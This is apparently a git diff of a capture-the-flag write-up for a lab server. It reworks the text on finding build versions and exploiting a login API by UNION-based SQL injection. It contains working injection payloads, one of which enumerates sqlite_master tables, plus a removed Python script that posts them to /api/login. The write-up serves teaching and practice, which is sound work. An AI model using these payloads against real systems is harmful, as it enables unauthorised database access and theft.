@@ -38,11 +38,9 @@ It is empty, besides the /info directory i found with gobuster:
 
 Using "curl" we will try to get more information from the http headers:
 
+![curlxgetcensored](https://user-images.githubusercontent.com/76821053/120239125-8a1b8480-c255-11eb-999d-10672b662826.png)
 
-
-Found the build version number for Vincent server:
-
-![curlxget](https://user-images.githubusercontent.com/76821053/119571524-5a7a0180-bda9-11eb-8536-6795514063ec.png)
+Found the build version number for Vincent server.
 
 Since there was a json file in the directory i did a GET request with option -H to accept application/json:
 
@@ -50,99 +48,72 @@ Since there was a json file in the directory i did a GET request with option -H 
 
 Found a new build number and a new server name.
 
-Now the room hinted that the server is vulnerable to sql injection, i need to find a way point to exploit it.
+Now the room hinted that the server is vulnerable to sql injection, we need to find a way point to exploit it.
 
-The server talks about “login API” so i try to see if there is anykind of vulnerability there:
+The server talks about “login API” so we'll try to see if there is anykind of vulnerability there:
 
- 
- 
- Know i know that i can reach /api/login and that if i ran the command 2 times it gives me different ouputs. Meaning that there is 2 servers probably and they read from diferent builds 1.3.4-dev and 1.3.6-final.
+![logincurlapi](https://user-images.githubusercontent.com/76821053/120239642-9ce28900-c256-11eb-8eeb-361c406f31c8.png)
 
-To start testing for vulnerabilities i wrote a simple python script:
+We now know that /api/login can be reached and that if we ran the command 2 times it gives us different ouputs. Meaning that there is 2 servers running, probably they read from diferent builds.
 
-Payloadallthethings:
+To start testing for vulnerabilities we can use a simple python script using a UNION sql injection. 
+
+Github [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)  source:
+
+![sqlunion](https://user-images.githubusercontent.com/76821053/120239998-707b3c80-c257-11eb-84ba-f016df12bf3d.png)
+
+Script:
+
+![pythonscript](https://user-images.githubusercontent.com/76821053/120240176-d7005a80-c257-11eb-8b9f-371341528f30.png)
 
 
-
-I started editing the script doing:
+We can start editing the script doing:
 
 1' UNION SELECT 1--+ '"
 1' UNION SELECT 1,2--+ '"
 1' UNION SELECT 1,2,3--+ '"
 1' UNION SELECT 1,2,3,4--+ '"
 
-till i got some kind of response from the server.. even dough the server was not ouputing errors and i found something.
+Till we got some kind of response from the server we keep adding numbers.. even dough the server was not ouputing errors.
+
+I kept running the script and got a response from the database:
+
+![execpython](https://user-images.githubusercontent.com/76821053/120240529-aec52b80-c258-11eb-97e1-024ccba1db80.png)
+
+Remember we have to run the script twice, because there's two servers.
+
+From the result of the scipt above we can see that the server has 2 tables. Now we need to find their names.
+
+![sqlitepayloadall](https://user-images.githubusercontent.com/76821053/120242534-fa79d400-c25c-11eb-9a76-00d71bacf4f6.png)
 
 
-import requests
-
-payload = "1' UNION SELECT 1,2--+ '"
-url = ' http://unstabletwin.thm/api/login'
-
-data = {"username": payload , "password": 12345}
-r = requests.post(url, data)
-print(r.text)
-
-
-
-I ran the script and got a call back:
-
-
-
-Again i had to run the script twice, because there is 2 servers.
-
-So i found that the server has 2 tables. Now i need to know what is their names.
-
-From payloadallthethings sqlite injection:
-
-
-
-To find version of mysql:
-
-
-
-I need to modify 
-
-
-
-To display the names of the tables i used the Integer/string based - Extract table name from payloadall..
-
-import requests
+To display the names of the tables i used the Integer/string based - Extract table name from PayloadAllTheThings.
 
 payload = ["1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '"]
-url = ' http://unstabletwin.thm/api/login'
 
-data = {"username": payload , "password": 12345}
-
-for i in payload:
-        r = requests.post(url, data)
-        print(r.text)
-        r = requests.post(url, data)
-        print(r.text)
-        
-        
-When i combine the new string injection i needed to had number 1, like so:
+When combining the new string injection we needed to had number 1, like so:
 
 original: 
 
 SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 
-altered separated by a “,” :
+Modified:
 
 SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 
-merged strings like so:
+Since we using a UNION based injection we can merged the strings like so:
 
 1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '
 
+We can also create a for loop so we don't have to do the request two times by reruning the script . 
 
-I also created a for loop to make the request two times, so in don't have to rerun the script . 
- 
- 
+![loopscript](https://user-images.githubusercontent.com/76821053/120242093-fbf6cc80-c25b-11eb-9ae6-4308906dd1f1.png)
 
+![execloop](https://user-images.githubusercontent.com/76821053/120242201-38c2c380-c25c-11eb-8747-22895475d741.png)
 
+Now to read the contents of the tables we will again modify the script and to be able to read the columns:
 
-Now to read the contents of the tables i will again modify the script and to be able to read the columns:
+![readcontentoftables](https://user-images.githubusercontent.com/76821053/120242376-a373ff00-c25c-11eb-9743-a6932e7552d8.png)
 
 
 
